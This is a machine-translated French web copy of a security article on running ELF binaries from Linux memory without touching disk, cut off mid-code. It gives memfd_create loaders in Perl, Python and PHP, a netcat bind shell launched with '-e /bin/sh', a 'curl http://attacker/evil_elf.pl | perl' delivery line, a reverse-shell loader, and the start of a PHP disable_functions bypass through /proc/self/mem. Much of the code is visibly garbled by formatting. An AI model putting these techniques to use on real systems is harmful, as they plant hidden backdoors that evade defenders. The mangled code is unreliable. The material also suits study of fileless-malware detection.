<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>ü§ñ üëåüèª üéì Elfes en m√©moire. Ex√©cution d'ELF dans la RAM Linux üÜé ü§≤üèΩ ü§Ωüèº</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="La distribution de logiciels malveillants sans fichiers gagne en popularit√©. Ce qui n'est pas surprenant, car le travail de tels programmes ne laisse ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Elfes en m√©moire. Ex√©cution d'ELF dans la RAM Linux</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/430902/"><p><img src="https://habrastorage.org/webt/rg/xt/yd/rgxtyd3contgoitlza_ve1zah2g.jpeg"></p><br><p>  La distribution de logiciels malveillants sans fichiers gagne en popularit√©.  Ce qui n'est pas surprenant, car le travail de tels programmes ne laisse pratiquement aucune trace.  Dans cet article, nous n'aborderons pas la technique d'ex√©cution des programmes dans la m√©moire de Windows.  Nous nous concentrons sur GNU / Linux.  Linux domine √† juste titre le segment des serveurs, vit sur des millions d'appareils int√©gr√©s et fournit la grande majorit√© des ressources Web.  Ensuite, nous ferons un bref examen des possibilit√©s d'ex√©cuter des programmes en m√©moire et d√©montrerons que cela est possible m√™me dans des conditions difficiles. </p><a name="habracut"></a><br><p>  Les techniques d'ex√©cution sans fichier sont secr√®tes; il est extr√™mement difficile de d√©tecter et de suivre leur utilisation.  Les outils de contr√¥le d'int√©grit√© du syst√®me de fichiers ne pr√©viendront pas l'administrateur, car aucune op√©ration d'√©criture sur le disque ou modification de fichier sur le disque ne se produit.  Les logiciels antivirus (souvent n√©glig√©s par les utilisateurs de * nix) ne contr√¥lent souvent pas la m√©moire du programme apr√®s le d√©marrage.  De plus, dans de nombreuses distributions GNU / Linux, imm√©diatement apr√®s l'installation, une large gamme de divers utilitaires de d√©bogage, interpr√®tes, compilateurs de langages de programmation et biblioth√®ques pour eux est disponible.  Tout cela cr√©e d'excellentes conditions pour l'utilisation de techniques d'ex√©cution de programme secr√®te et sans fichier.  Mais en plus des avantages de leur utilisation, il y a aussi des inconv√©nients - ces programmes ne survivent pas √† la panne ou au red√©marrage de l'h√¥te cible.  Mais pendant que l'h√¥te fonctionne, le programme fonctionne. </p><br><p>  De telles techniques peuvent et doivent √™tre utilis√©es non seulement pour la distribution de logiciels malveillants.  Si la vitesse d'ex√©cution de votre programme est critique pour vous, d√©chargez-la dans la RAM.  En fait, de nombreuses distributions Linux se sentent bien lorsqu'elles s'ex√©cutent compl√®tement en RAM, ce qui vous permet de travailler avec des disques durs sans enregistrer de fichiers dessus.  Du point de vue de l'audit de s√©curit√© de l'information, les m√©thodes d'ex√©cution secr√®te des programmes sont tr√®s utiles comme √©tape de post-op√©ration et d'intelligence dans le p√©rim√®tre du r√©seau cible.  Surtout si le secret maximum est l'une des conditions d'audit. <br>  Selon le portail <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">barkly.com</a> en 2018, d√©j√† 35% des attaques de virus se produisent dans des logiciels malveillants ex√©cut√©s en m√©moire. </p><br><p>  Dans le cas de Windows, les cybercriminels utilisent activement le syst√®me Powershell pr√©install√© afin de t√©l√©charger et d'ex√©cuter imm√©diatement le code.  Ces techniques sont largement utilis√©es, entre autres, gr√¢ce √† leur impl√©mentation dans des frameworks tels que Powershell Empire, Powersploit et Metasploit Framework. </p><br><h1 id="a-chto-naschet-linux">  Et Linux? </h1><br><p>  Dans la plupart des cas, les distributions Linux install√©es sur les h√¥tes ont un ensemble de logiciels pr√©install√©.  En r√®gle g√©n√©rale, des interpr√®tes de langages de programmation sont disponibles: compilateur Python, Perl, C. PHP est pr√©sent sur les sites d'h√©bergement dans l'appendice.  Cette condition permet d'ex√©cuter du code √† l'aide de ces langages. </p><br><p>  Sous Linux, nous avons plusieurs options bien connues pour ex√©cuter du code en m√©moire. <br>  Le moyen le plus simple consiste √† utiliser la zone de m√©moire partag√©e pr√©-mont√©e sur le syst√®me de fichiers. </p><br><p>  En pla√ßant le fichier ex√©cutable dans le r√©pertoire / dev / shm ou / run / shm, il est possible de l'ex√©cuter directement en m√©moire, √©tant donn√© que ces r√©pertoires ne sont rien de plus qu'une m√©moire √† acc√®s al√©atoire mont√©e sur le syst√®me de fichiers.  Mais ils peuvent √™tre visualis√©s avec ls comme n'importe quel autre r√©pertoire.  Et en r√®gle g√©n√©rale, ces r√©pertoires sont mont√©s avec l'indicateur noexec, et l'ex√©cution des programmes dans ces r√©pertoires n'est disponible que pour le superutilisateur.  Donc, pour √™tre un peu plus discret, vous avez besoin d'autre chose. </p><br><p> Plus remarquable est l'appel syst√®me <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">memfd_create (2)</a> .  Cet appel syst√®me fonctionne √† peu pr√®s comme <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">malloc (3)</a> , mais ne renvoie pas de pointeur vers une zone m√©moire, mais un descripteur de fichier vers un fichier anonyme, qui n'est visible dans le syst√®me de fichiers qu'en tant que lien dans <code>/proc/PID/fd/</code> , par lequel il peut √™tre ex√©cut√© √† l'aide de <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">execve (2).</a> <br>  Voici ce que dit la page de manuel d'utilisation de l' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">appel</a> syst√®me <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">memfd_create (en russe)</a> : </p><br><p>  <em>"Le nom sp√©cifi√© dans</em> <code>name</code> <em>est utilis√© comme nom de fichier et sera affich√© comme cible du lien symbolique correspondant dans le r√©pertoire. <code>/proc/self/fd/</code> . Le nom d'affichage commence toujours par <code>memfd:</code> et sert uniquement au d√©bogage. Les noms n'affectent pas le comportement du fichier "descripteur, et donc plusieurs fichiers peuvent avoir le m√™me nom sans aucune cons√©quence."</em> </p><br><p>  Un exemple d'utilisation de <code>memfd_create()</code> pour le langage C: </p><br><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;sys/syscall.h&gt; #include &lt;sys/types.h&gt; #include &lt;sys/wait.h&gt; #include &lt;unistd.h&gt; int main() { int fd; pid_t child; char buf[BUFSIZ] = ""; ssize_t br; fd = syscall(SYS_memfd_create, "foofile", 0); if (fd == -1) { perror("memfd_create"); exit(EXIT_FAILURE); } child = fork(); if (child == 0) { dup2(fd, 1); close(fd); execlp("/bin/date", "/bin/date", NULL); perror("execlp date"); exit(EXIT_FAILURE); } else if (child == -1) { perror("fork"); exit(EXIT_FAILURE); } waitpid(child, NULL, 0); lseek(fd, 0, SEEK_SET); br = read(fd, buf, BUFSIZ); if (br == -1) { perror("read"); exit(EXIT_FAILURE); } buf[br] = 0; printf("child said: '%s'\n", buf); exit(EXIT_SUCCESS); }</span></span></span></span></code> </pre><br><p>  Le code ci-dessus utilise <code>memfd</code> , cr√©e un processus enfant, dirige sa sortie vers un fichier temporaire, attend que le processus enfant se termine et lit sa sortie √† partir du fichier temporaire.  Habituellement, le canal "|" est utilis√© pour rediriger la sortie d'un programme vers l'entr√©e d'un autre dans * nix. </p><br><p>  La possibilit√© d'utiliser <code>syscall()</code> est √©galement disponible dans des langages interpr√©t√©s tels que perl, python, etc ... Ensuite, nous consid√©rons l'un des sc√©narios possibles et d√©montrons la possibilit√© de charger des fichiers ex√©cutables en m√©moire √† l'aide de <code>memfd_create()</code> . </p><br><h3 id="perl">  Perl </h3><br><p>  Supposons que nous ayons un point d'entr√©e sous la forme d'une injection de commande. <br>  Nous avons besoin d'un moyen de faire des appels syst√®me sur le syst√®me cible. <br>  En perl, la fonction <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">syscall ()</a> nous y aidera. <br>  Nous aurons √©galement besoin d'un moyen d'√©crire notre ELF directement dans la m√©moire en tant que contenu d'un fichier anonyme. <br>  Pour ce faire, nous placerons notre ELF directement dans le corps du script, qui √† son tour sera transf√©r√© vers le syst√®me cible via l'injection de commande disponible.  Alternativement, vous pouvez √©galement t√©l√©charger le fichier ex√©cutable sur le r√©seau. <br>  Mais avant cela, il vaut la peine de faire une r√©servation.  Nous devons conna√Ætre la version du noyau linux sur l'h√¥te cible, puisque l'appel syst√®me <code>memfd_create()</code> requis n'est disponible qu'√† partir de la version <strong>3.17</strong> et sup√©rieure. </p><br><p>  Examinons de plus <code>memfd_create()</code> et <code>execve()</code> </p><br><p>  Pour notre fichier anonyme, nous utiliserons la constante <code>MFD_CLOEXEC</code> , qui "d√©finit l'indicateur de <code>close-on-exec (FD_CLOEXEC)</code> pour un nouveau descripteur de fichier ouvert".  Cela signifie que notre descripteur de fichier se fermera automatiquement apr√®s l'ex√©cution de notre ELF en utilisant <code>execve()</code> </p><br><p>  Puisque nous utiliserons la fonction <code>syscall()</code> du langage Perl, nous aurons besoin de valeurs num√©riques pour appeler notre <code>syscall</code> et son param√®tre. <br>  Vous pouvez les trouver dans <code>/usr/include</code> ou sur Internet.  Le num√©ro d'appel syst√®me se trouve dans <code>#define</code> commen√ßant par <code>__NR_</code> <br>  Dans notre cas, <code>memfd_create()</code> est num√©rot√© 319 pour un syst√®me d'exploitation 64 bits.  Et la constante est <code>FD_CLOSEXEC 0x0001U</code> (c'est-√†-dire 1 dans le <code>linux/memfd.h</code> ) </p><br><p>  Nous avons maintenant toutes les valeurs num√©riques n√©cessaires, et nous pouvons √©crire en Perl un analogue de <code>memfd_create(name, MFD_CLOEXEC)</code> de C. <br>  Nous devrons √©galement trouver un nom de fichier qui sera affich√© dans <code>/memfd:</code> <br>  Il sera optimal de choisir un nom similaire √† <code>[:kworker]</code> ou un autre, sans susciter de suspicion. <br>  Par exemple, nous passerons une cha√Æne vide au param√®tre name: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $name = <span class="hljs-string"><span class="hljs-string">""</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $fd = <span class="hljs-keyword"><span class="hljs-keyword">syscall</span></span>(<span class="hljs-number"><span class="hljs-number">319</span></span>, $name, <span class="hljs-number"><span class="hljs-number">1</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $fd) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"memfd_create: $!"</span></span>; }</code> </pre> <br><p>  Nous avons maintenant le descripteur de fichier anonyme dans $ fd et nous devons √©crire l'ELF dans ce fichier. <br>  La fonction <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">open ()</a> en perl est g√©n√©ralement utilis√©e pour ouvrir des fichiers, mais en utilisant la construction <code>&gt;&amp;=FD</code> , en passant le descripteur √† cette fonction au lieu du nom de fichier, nous transformons le descripteur de fichier d√©j√† ouvert en descripteur de fichier. <br>  <code>autoflush[]</code> serait √©galement utile: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">open</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $FH, <span class="hljs-string"><span class="hljs-string">'&gt;&amp;='</span></span>.$fd) <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"open: $!"</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">select</span></span>((<span class="hljs-keyword"><span class="hljs-keyword">select</span></span>($FH), $|=<span class="hljs-number"><span class="hljs-number">1</span></span>)[<span class="hljs-number"><span class="hljs-number">0</span></span>]);</code> </pre> <br><p>  Nous avons maintenant une poign√©e qui fait r√©f√©rence √† un fichier anonyme. </p><br><p>  Ensuite, nous devons convertir notre fichier ex√©cutable en donn√©es qui peuvent √™tre plac√©es dans le corps d'un script Perl. <br>  Pour ce faire, nous effectuons: </p><br><pre> <code class="plaintext hljs">$ perl -e '$/=\32;print"print \$FH pack q/H*/, q/".(unpack"H*")."/\ or die qq/write: \$!/;\n"while(&lt;&gt;)' ./elfbinary</code> </pre> <br><p>  Nous obtenons beaucoup, beaucoup de lignes similaires: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">7</span></span>f454c4602010100000000000000000002003e0001000000304f45000000000<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">4000000000000000</span></span>c8010000000000000000000040003800070040001700030<span class="hljs-number"><span class="hljs-number">0</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/; <span class="hljs-keyword"><span class="hljs-keyword">print</span></span> $FH <span class="hljs-keyword"><span class="hljs-keyword">pack</span></span> <span class="hljs-keyword"><span class="hljs-keyword">q</span></span>/H*<span class="hljs-regexp"><span class="hljs-regexp">/, q/</span></span><span class="hljs-number"><span class="hljs-number">0600000004000000400000000000000040004000000000004000400000000000</span></span>/ <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> qq/<span class="hljs-keyword"><span class="hljs-keyword">write</span></span>: $!/;</code> </pre> <br><p>  Apr√®s les avoir ex√©cut√©s, nous mettrons notre fichier ex√©cutable en m√©moire.  Il ne nous reste plus qu'√† le lancer. </p><br><h4 id="fork">  fourche () </h4><br><p>  En option, nous pouvons utiliser <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">fork ()</a> .  Ce n'est pas du tout n√©cessaire.  Mais si nous voulons non seulement ex√©cuter ELF et tuer le processus, nous devrons utiliser <code>fork()</code> . <br>  En g√©n√©ral, la cr√©ation d'un processus enfant en perl ressemble √† ceci: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">while</span></span> ($keep_going) { <span class="hljs-keyword"><span class="hljs-keyword">my</span></span> $pid = <span class="hljs-keyword"><span class="hljs-keyword">fork</span></span>(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (-<span class="hljs-number"><span class="hljs-number">1</span></span> == $pid) { <span class="hljs-comment"><span class="hljs-comment"># Error die "fork: $!"; } if (0 == $pid) { exit 0; } }</span></span></code> </pre> <br><p>  L'utilit√© de <code>fork()</code> √©galement dans le fait qu'en l'appelant avec <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">setsid (2)</a> , vous pouvez s√©parer le processus enfant du processus parent et laisser le parent se terminer: </p><br><pre> <code class="perl hljs"><span class="hljs-comment"><span class="hljs-comment">#    my $pid = fork(); if (-1 == $pid) { # Error die "fork1: $!"; } if (0 != $pid) { #   exit 0; } #     if (-1 == syscall(112)) { die "setsid: $!"; } #    () $pid = fork(); if (-1 == $pid) { # Error die "fork2: $!"; } if (0 != $pid) { #    exit 0; } #   ""</span></span></code> </pre> <br><p>  Nous pouvons maintenant ex√©cuter ELF dans de nombreux processus. </p><br><h4 id="execve">  Execve () </h4><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Execve ()</a> est un appel syst√®me qui nous permet d'ex√©cuter un programme.  Perl nous offre des fonctionnalit√©s similaires via la fonction <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">Exec ()</a> , qui fonctionne exactement comme l'appel syst√®me susmentionn√©, mais a une syntaxe beaucoup plus simple et plus pratique. <br>  Nous devons passer deux choses √† <code>exec()</code> : le fichier que nous voulons ex√©cuter (notre m√©moire ELF pr√©c√©demment charg√©e) et le nom du processus comme l'un des arguments pass√©s.  Habituellement, le nom du processus correspond au nom du fichier ex√©cutable.  Mais puisque nous verrons <code>/proc/PID/fd/3</code> dans la liste des processus, nous appellerons notre processus autre chose. <br>  La syntaxe de <code>exec()</code> la suivante: </p><br><pre> <code class="perl hljs"><span class="hljs-keyword"><span class="hljs-keyword">exec</span></span> {<span class="hljs-string"><span class="hljs-string">"/proc/$$/fd/$fd"</span></span>} <span class="hljs-string"><span class="hljs-string">"nc"</span></span>, <span class="hljs-string"><span class="hljs-string">"-kvl"</span></span>, <span class="hljs-string"><span class="hljs-string">"4444"</span></span>, <span class="hljs-string"><span class="hljs-string">"-e"</span></span>, <span class="hljs-string"><span class="hljs-string">"/bin/sh"</span></span> <span class="hljs-keyword"><span class="hljs-keyword">or</span></span> <span class="hljs-keyword"><span class="hljs-keyword">die</span></span> <span class="hljs-string"><span class="hljs-string">"exec: $!"</span></span>;</code> </pre> <br><p>  L'exemple ci-dessus d√©marre Netcat.  Mais nous aimerions lancer quelque chose d'un peu moins comme une porte d√©rob√©e. <br>  Le processus en cours d'ex√©cution n'aura pas de lien vers le fichier anonyme dans <code>/proc/PID/fd</code> , mais nous pouvons toujours trouver notre ELF dans le lien <code>/proc/PID/exe</code> , qui pointe vers le fichier du processus en cours d'ex√©cution. <br>  Nous avons donc lanc√© ELF dans la m√©moire Linux, sans toucher au disque ni m√™me au syst√®me de fichiers. <br>  Il est possible de t√©l√©charger notre fichier ex√©cutable sur le syst√®me cible rapidement et facilement, par exemple, en passant un script √† l'interpr√©teur Perl, dans le corps duquel nous avons plac√© ELF et l'avons plac√© sur un h√©bergement Web externe: <code>$ curl http://attacker/evil_elf.pl | perl</code> <code>$ curl http://attacker/evil_elf.pl | perl</code> </p><br><h3 id="python">  Python </h3><br><p>  Semblable √† l'option Perl, nous devons effectuer les op√©rations suivantes: </p><br><ul><li>  √† l'aide de l'appel syst√®me memfd_create (), cr√©ez un fichier anonyme en m√©moire </li><li>  √©crire l'ex√©cutable ELF dans ce fichier </li><li>  l'ex√©cuter et √©ventuellement l'ex√©cuter plusieurs fois avec fork () </li></ul><br><pre> <code class="python hljs"><span class="hljs-keyword"><span class="hljs-keyword">import</span></span> ctypes <span class="hljs-keyword"><span class="hljs-keyword">import</span></span> os <span class="hljs-comment"><span class="hljs-comment">#   .     - binary = open('/tmp/rev-shell','rb').read() fd = ctypes.CDLL(None).syscall(319,"",1) #  memfd_create     final_fd = open('/proc/self/fd/'+str(fd),'wb') #    . final_fd.write(binary) final_fd.close() fork1 = os.fork() #   if 0 != fork1: os._exit(0) ctypes.CDLL(None).syscall(112) #  setsid()     . fork2 = os.fork() #     . if 0 != fork2: os._exit(0) os.execl('/proc/self/fd/'+str(fd),'argv0','argv1') #    .</span></span></code> </pre> <br><p>  Dans le cas de python, pour appeler <code>syscall</code> nous avons besoin des modules standard <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ctypes</a> et <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">os</a> pour √©crire et ex√©cuter le fichier et contr√¥ler le processus.  Tout est compl√®tement analogue √† la version Perl. <br>  Dans le code ci-dessus, nous √©crivons dans le fichier un fichier pr√©c√©demment localis√© dans le <code>/tmp/</code> .  Cependant, rien ne nous emp√™che de t√©l√©charger le fichier depuis le serveur Web. </p><br><h3 id="php">  Php </h3><br><p>  √Ä ce stade, nous pouvons d√©j√† utiliser perl et python.  Les interpr√®tes de ces langues sont install√©s par d√©faut sur de nombreux syst√®mes d'exploitation.  Mais le plus int√©ressant, comme toujours, est devant. <br>  Si, pour une raison quelconque, les interpr√®tes perl ou python ne sont pas disponibles pour nous, ce serait bien d'utiliser PHP.  Ce langage est tr√®s populaire parmi les d√©veloppeurs Web.  Et si nous avons d√©j√† trouv√© la possibilit√© d'ex√©cuter du code dans une application web, c'est avec une forte probabilit√© que l'interpr√©teur PHP nous rencontre. </p><br><p>  Malheureusement, php n'a pas de m√©canismes <code>syscall</code> pour appeler <code>syscall</code> . <br>  Nous sommes tomb√©s sur un <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">message</a> de Beched'a sur le forum rdot (Merci Beched!), Qui √©crase l'appel de la fonction <code>open</code> au <code>system</code> via <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">procfs</a> <code>/proc/self/mem</code> dans la m√©moire du processus actuel et contourne <code>disable_functions</code> . <br>  Nous avons utilis√© cette astuce pour r√©√©crire la fonction dans notre code, ce qui entra√Ænera les appels syst√®me n√©cessaires. <br>  Nous passerons syscall √† l'interpr√©teur php sous forme de shellcode sur l'assembleur. <br>  Les appels syst√®me devront √™tre pass√©s via une s√©quence de commandes. <br>  Commen√ßons √† √©crire un script PHP.  Ensuite, il y aura beaucoup de magie. </p><br><p>  Tout d'abord, nous d√©signons les param√®tres n√©cessaires: </p><br><pre> <code class="php hljs"> $elf = file_get_contents(<span class="hljs-string"><span class="hljs-string">"/bin/nc.traditional"</span></span>); <span class="hljs-comment"><span class="hljs-comment">// elf_payload $args = "test -lvvp 31338 -e /bin/bash"; // argv0 argv1 argv2 ...</span></span></code> </pre> <br><p>  Notons le d√©calage - les valeurs sup√©rieures et inf√©rieures en m√©moire, o√π nous placerons plus tard notre shellcode: </p><br><pre> <code class="php hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">packlli</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ $higher = ($value &amp; <span class="hljs-number"><span class="hljs-number">0xffffffff00000000</span></span>) &gt;&gt; <span class="hljs-number"><span class="hljs-number">32</span></span>; $lower = $value &amp; <span class="hljs-number"><span class="hljs-number">0x00000000ffffffff</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> pack(<span class="hljs-string"><span class="hljs-string">'V2'</span></span>, $lower, $higher); }</code> </pre> <br><p>  Vient ensuite la fonction par laquelle le fichier binaire est ¬´d√©compress√©¬ª.  Pour ce faire, nous convertissons les donn√©es binaires en une repr√©sentation d√©cimale en utilisant la fonction <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">hexdex () des</a> donn√©es binaires <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">bin2hex ()</a> dans l' <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ordre inverse</a> (pour le stockage): </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">unp</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> hexdec(bin2hex(strrev($value))); }</code> </pre> <br><p>  Ensuite, le fichier <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">ELF</a> est analys√© pour obtenir des d√©calages: </p><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseelf</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">($bin_ver, $rela = false)</span></span></span><span class="hljs-function"> </span></span>{ $bin = file_get_contents($bin_ver); $e_shoff = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x28</span></span>, <span class="hljs-number"><span class="hljs-number">8</span></span>)); $e_shentsize = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3a</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shnum = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3c</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); $e_shstrndx = unp(substr($bin, <span class="hljs-number"><span class="hljs-number">0x3e</span></span>, <span class="hljs-number"><span class="hljs-number">2</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">for</span></span>($i = <span class="hljs-number"><span class="hljs-number">0</span></span>; $i &lt; $e_shnum; $i += <span class="hljs-number"><span class="hljs-number">1</span></span>) { $sh_type = unp(substr($bin, $e_shoff + $i * $e_shentsize + <span class="hljs-number"><span class="hljs-number">4</span></span>, <span class="hljs-number"><span class="hljs-number">4</span></span>)); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>($sh_type == <span class="hljs-number"><span class="hljs-number">11</span></span>) { <span class="hljs-comment"><span class="hljs-comment">// SHT_DYNSYM $dynsym_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $dynsym_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $dynsym_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } elseif(!isset($strtab_off) &amp;&amp; $sh_type == 3) { // SHT_STRTAB $strtab_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8)); $strtab_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); } elseif($rela &amp;&amp; $sh_type == 4) { // SHT_RELA $relaplt_off = unp(substr($bin, $e_shoff + $i * $e_ + 24, 8)); $relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8)); $relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8)); } } if($rela) { for($i = $relaplt_off; $i &lt; $relaplt_off + $relaplt_size; $i += $relaplt_entsize) { $r_offset = unp(substr($bin, $i, 8)); $r_info = unp(substr($bin, $i + 8, 8)) &gt;&gt; 32; $name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4)); $name = ''; $j = $strtab_off + $name_off - 1; while($bin[++$j] != "\0") { $name .= $bin[$j]; } if($name == 'open') { return $r_offset; } } } else { for($i = 